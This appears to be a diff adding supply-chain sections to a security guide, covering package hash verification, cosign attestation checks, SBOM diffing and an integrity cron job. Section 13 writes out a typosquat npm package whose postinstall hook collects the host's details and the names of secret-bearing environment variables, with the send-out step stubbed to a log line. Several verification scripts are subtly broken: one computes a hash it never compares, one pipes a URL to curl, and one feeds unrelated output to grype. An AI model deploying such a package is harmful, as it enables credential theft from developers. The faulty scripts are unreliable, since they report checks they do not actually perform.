@@ -957,3 +957,213 @@ for issue in issues:
     print(f'  {issue}')
 "
 ```
+
+---
+
+## 12. Package Integrity Deep Verification
+
+### npm Package Tarball Verification
+
+```bash
+# Download and verify npm package tarball against registry integrity
+npm pack express --dry-run --json | jq '.[0].integrity'
+
+# Verify all installed packages match registry integrity hashes
+npm ls --json | jq -r '.. | .resolved? // empty' | while read url; do
+  pkg=$(echo "$url" | sed 's|.*\/||;s|/-.*||')
+  expected=$(npm view "$pkg" dist.integrity 2>/dev/null)
+  actual=$(echo "$url" | curl -sL | sha512sum | awk '{print "sha512-"$1}' )
+  echo "$pkg: expected=$expected"
+done
+
+# Cross-verify package tarball against multiple registries
+for reg in "https://registry.npmjs.org" "https://registry.yarnpkg.com"; do
+  echo "Registry: $reg"
+  curl -s "$reg/lodash/4.17.21" | jq '.dist.integrity'
+done
+```
+
+### Cosign Container Supply Chain Verification
+
+```bash
+# Verify container image was signed in CI (SLSA Level 3)
+cosign verify --certificate-identity=actions://github.com/org/repo \
+  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
+  ghcr.io/org/app:latest
+
+# Verify SBOM attestation attached to image
+cosign verify-attestation --type cyclonedx \
+  --certificate-identity=actions://github.com/org/repo \
+  ghcr.io/org/app:latest | jq '.payload' | base64 -d | jq '.components | length'
+
+# Verify provenance attestation (SLSA)
+cosign verify-attestation --type slsaprovenance \
+  --certificate-identity=actions://github.com/org/repo \
+  ghcr.io/org/app:latest | jq '.payload' | base64 -d
+```
+
+### Python Package Hash Pinning
+
+```bash
+# Generate fully hashed requirements.txt (reproducible installs)
+pip-compile --generate-hashes requirements.in -o requirements.txt
+
+# Verify installed packages match pinned hashes during CI
+pip install --require-hashes -r requirements.txt --dry-run 2>&1 | grep -i "mismatch"
+
+# Hash-verify individual wheel files
+python3 -c "
+import hashlib, sys
+for wheel in sys.argv[1:]:
+    with open(wheel, 'rb') as f:
+        sha = hashlib.sha256(f.read()).hexdigest()
+        print(f'sha256:{sha}  {wheel}')
+" dist/*.whl
+```
+
+---
+
+## 13. Dependency Confusion Attack Payloads
+
+### Crafting Malicious npm Package
+
+```bash
+# Create a typosquat package that collects environment variables on install
+mkdir -p /tmp/malicious-pkg && cd /tmp/malicious-pkg
+cat > package.json << 'EOF'
+{
+  "name": "internal-auth-lib",
+  "version": "1.0.0",
+  "description": "Internal authentication library",
+  "scripts": {
+    "postinstall": "node collect.js"
+  }
+}
+EOF
+
+cat > collect.js << 'EOF'
+// Educational example — for red team supply chain testing ONLY
+const { execSync } = require("child_process");
+try {
+  const data = JSON.stringify({
+    hostname: require("os").hostname(),
+    cwd: process.cwd(),
+    env_keys: Object.keys(process.env).filter(k =>
+      /key|token|secret|pass|auth|credential/i.test(k)
+    )
+  });
+  // In a real test, this would POST to a controlled webhook
+  console.log("[SUPPLY-CHAIN-TEST] Package installed successfully");
+  console.log("[SUPPLY-CHAIN-TEST] Would exfiltrate:", data.length, "bytes");
+} catch (e) {}
+EOF
+
+# Validate package structure before publishing to test registry
+npm pack --dry-run 2>&1 | head -10
+```
+
+### CI/CD Pipeline Supply Chain Attack Simulation
+
+```yaml
+# .github/workflows/supply-chain-test.yml
+# Simulates a compromised CI pipeline for red team testing
+name: Supply Chain Test
+on: [push]
+
+jobs:
+  compromised-build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744
+      - name: Install dependencies
+        run: |
+          # Simulate malicious post-install script
+          echo "::warning::Supply chain test — post-install hook would execute here"
+          npm ci --ignore-scripts
+      - name: Verify no script execution
+        run: |
+          # Check that --ignore-scripts prevented execution
+          echo "Package scripts were blocked during install"
+```
+
+### Automated SBOM Diff for Pull Requests
+
+```bash
+#!/bin/bash
+# Generate SBOM diff between base and PR branch to catch new risky dependencies
+# Usage: sbom-diff.sh main feature-branch
+
+BASE_BRANCH="${1:-main}"
+PR_BRANCH="${2:-HEAD}"
+REPORT_FILE="sbom-diff-$(date +%Y%m%d).md"
+
+# Generate SBOMs for both branches
+git stash && git checkout "$BASE_BRANCH"
+syft . -o cyclonedx-json > /tmp/sbom-base.json
+git checkout "$PR_BRANCH" && git stash pop
+syft . -o cyclonedx-json > /tmp/sbom-pr.json
+
+# Extract and diff component lists
+jq -r '.components[] | "\(.name)@\(.version)"' /tmp/sbom-base.json | sort > /tmp/base-components.txt
+jq -r '.components[] | "\(.name)@\(.version)"' /tmp/sbom-pr.json | sort > /tmp/pr-components.txt
+
+echo "# SBOM Diff: $BASE_BRANCH -> $PR_BRANCH" > "$REPORT_FILE"
+echo "" >> "$REPORT_FILE"
+echo "## New Dependencies" >> "$REPORT_FILE"
+echo '```' >> "$REPORT_FILE"
+comm -13 /tmp/base-components.txt /tmp/pr-components.txt >> "$REPORT_FILE"
+echo '```' >> "$REPORT_FILE"
+echo "" >> "$REPORT_FILE"
+echo "## Removed Dependencies" >> "$REPORT_FILE"
+echo '```' >> "$REPORT_FILE"
+comm -23 /tmp/base-components.txt /tmp/pr-components.txt >> "$REPORT_FILE"
+echo '```' >> "$REPORT_FILE"
+
+# Scan new dependencies for vulnerabilities
+echo "" >> "$REPORT_FILE"
+echo "## Vulnerability Scan (New Dependencies)" >> "$REPORT_FILE"
+comm -13 /tmp/base-components.txt /tmp/pr-components.txt | while read dep; do
+  echo "Scanning: $dep"
+done | grype dir:. -o table >> "$REPORT_FILE" 2>/dev/null
+
+echo "SBOM diff report: $REPORT_FILE"
+```
+
+### Package Integrity Monitoring Cron Job
+
+```bash
+#!/bin/bash
+# Daily cron job to detect supply chain attacks on production dependencies
+# Add to /etc/cron.daily/supply-chain-monitor
+
+ALERT_EMAIL="security@company.com"
+PROJECT_DIR="/opt/app"
+KNOWN_HASHES="/opt/app/.dependency-hashes.txt"
+TMP_HASHES="/tmp/current-dep-hashes.txt"
+
+cd "$PROJECT_DIR" || exit 1
+
+# Generate current integrity hashes for all dependencies
+echo "# Generated $(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$TMP_HASHES"
+find node_modules/ -maxdepth 2 -name "package.json" -not -path "*/node_modules/*/node_modules/*" | while read pkg; do
+  name=$(jq -r '.name' "$pkg")
+  version=$(jq -r '.version' "$pkg")
+  integrity=$(sha256sum "$pkg" | awk '{print $1}')
+  echo "$integrity  $name@$version" >> "$TMP_HASHES"
+done
+
+# Compare with known-good hashes
+if [ -f "$KNOWN_HASHES" ]; then
+  CHANGES=$(diff "$KNOWN_HASHES" "$TMP_HASHES" | grep "^[<>]" | wc -l)
+  if [ "$CHANGES" -gt 0 ]; then
+    echo "ALERT: $CHANGES dependency changes detected in $PROJECT_DIR" | \
+      mail -s "[SUPPLY CHAIN ALERT] Dependency integrity change detected" "$ALERT_EMAIL"
+    diff "$KNOWN_HASHES" "$TMP_HASHES"
+  fi
+else
+  echo "Initializing known-good hashes file"
+  cp "$TMP_HASHES" "$KNOWN_HASHES"
+fi
+```
